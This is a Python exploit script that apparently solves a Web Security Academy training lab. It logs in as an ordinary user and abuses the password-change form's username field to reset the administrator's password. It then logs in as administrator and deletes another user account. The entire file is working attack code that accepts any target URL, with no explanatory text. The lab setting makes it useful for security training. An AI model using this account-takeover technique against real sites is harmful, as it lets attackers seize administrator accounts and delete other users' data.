import sys
import requests
from bs4 import BeautifulSoup



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def regular_user_login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    if response.status_code == 200:
        csrf_token = extract_csrf_token(response)
        data = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
        login_response = session.post(f"{url}/login", data=data, timeout=10)
        return "Your username is: wiener" in login_response.text


def change_admin_password(url, session):
    response = session.get(f"{url}/my-account", timeout=10)
    csrf_token = extract_csrf_token(response)
    data = {"csrf": csrf_token, "username": "administrator", "new-password-1": "pass", "new-password-2":"pass"}
    change_password_response = session.post(f"{url}/my-account/change-password", data=data, timeout=10)
    return "Password changed successfully!" in change_password_response.text


def log_out(url, session):
    session.get(f"{url}/logout", timeout=10)


def administrator_login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)
    data = {"csrf": csrf_token, "username": "administrator", "password": "pass"}
    login_response = session.post(f"{url}/login", data=data, timeout=10)
    return login_response.status_code == 200


def delete_user(url, session):
    delete_user_response = session.get(f"{url}/admin/delete?username=carlos")
    return "User deleted successfully!" in delete_user_response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in as user \"wiener\"...")
        if not regular_user_login(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Changing administrator password...")
        if not change_admin_password(url, session):
            print("(-) Failed to change the administrator password.")
            sys.exit(1)

        print("(+) Logging in as administrator user...")
        log_out(url, session)
        if not administrator_login(url, session):
            print("(-) Failed to log in as administrator.")
            sys.exit(1)

        print("(+) Deleting user \"carlos\"...")
        if delete_user(url, session):
            print("(+) User deleted successfully!")
        else:
            print("(-) Failed to delete user \"carlos\".")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()